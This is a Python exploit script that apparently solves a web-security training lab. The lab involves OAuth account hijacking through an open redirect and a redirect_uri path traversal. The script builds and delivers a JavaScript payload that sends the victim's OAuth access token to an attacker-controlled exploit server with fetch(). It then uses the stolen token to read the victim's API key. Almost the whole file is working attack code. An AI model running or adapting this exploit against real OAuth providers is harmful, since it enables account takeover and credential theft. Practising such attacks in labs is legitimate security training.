import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def extract_oauth_url(text):
    soup = BeautifulSoup(text, 'html.parser')
    oauth_url = soup.find('meta').get('content') # type: ignore
    return oauth_url

def oauth_login_url(s, url, path):
    target = url + path
    r = s.get(target, allow_redirects=False)
    oauth_url = extract_oauth_url(r.text).split('url=')[1] # type: ignore

    if oauth_url:
        print(f'[+] Found oauth url = {oauth_url}')
        return oauth_url
    else:
        print('[-] Not fount oauth url')
        sys.exit(-1)

def goto(s, url, path):
    target_url = url + path
    r = s.get(target_url)

def send_payload_to_victim(s, exploit_url, exploit_path, payload): 
    target_url = exploit_url + exploit_path
    payload = {
        'urlIsHttps': 'on',
        'responseFile': '/exploit',
        'responseHead': 'HTTP/1.1 200 OK \
                        Content-Type: text/html; charset=utf-8',
        'responseBody': payload,
        'formAction': 'DELIVER_TO_VICTIM'
    }
    r = s.post(target_url, data=payload, allow_redirects=True)

    if r.status_code == 200:
        print('[+] Sent vuln request to exploit CORS vuln')
    else:
        print('[-] Fail to send vuln request')
        sys.exit(-1)

def extract_access_token(s, exploit_url, path):
    target_url = exploit_url + path
    r = s.get(target_url)
    access_token = r.text.split('access_token=')[-1].split('&')[0]
    return access_token

def get_api_key(s, oauth_url, oauth_path, headers):
    target_url = oauth_url + oauth_path
    r = s.get(target_url, headers=headers)
    data = json.loads(r.text)
    api_key = data.get("apikey")
    print(f'[+] Got API_key = {api_key}')
    return api_key
    
def submit(s, url, path, api_key):
    submit_url = url + path
    payload = { 'answer': api_key }
    r = s.post(submit_url, data=payload, headers=headers)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <exploit_url>" % sys.argv[0])
        print("(+) Example: %s www.example.com www.abc.exploit-server.net" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 
    exploit_url = sys.argv[2][:-1] if sys.argv[2][-1] == '/' else sys.argv[2]

    oauth = oauth_login_url(s, url, '/social-login')
    oauth_url = oauth.split('/auth')[0]
    oauth_path = oauth.split(oauth_url)[1]

    payload = f"""
    <script>
        if (location.hash) {{
            fetch('{exploit_url}/log?' + location.hash.substring(1));
        }} else {{
            document.write('<iframe src="{oauth_url}{oauth_path}"></iframe>');
        }}
    </script>
    """
    payload = payload.replace('/oauth-callback', f'/oauth-callback/../post/next?path={exploit_url}/exploit')

    send_payload_to_victim(s, exploit_url, '/', payload)
    access_token = extract_access_token(s, exploit_url, '/log')
    headers = { "Authorization": f"Bearer {access_token}" }
    api_key = get_api_key(s, oauth_url, '/me', headers)
    submit(s, url, '/submitSolution', api_key)

    check_solved_lab(s, url)

if __name__ == '__main__':
    main()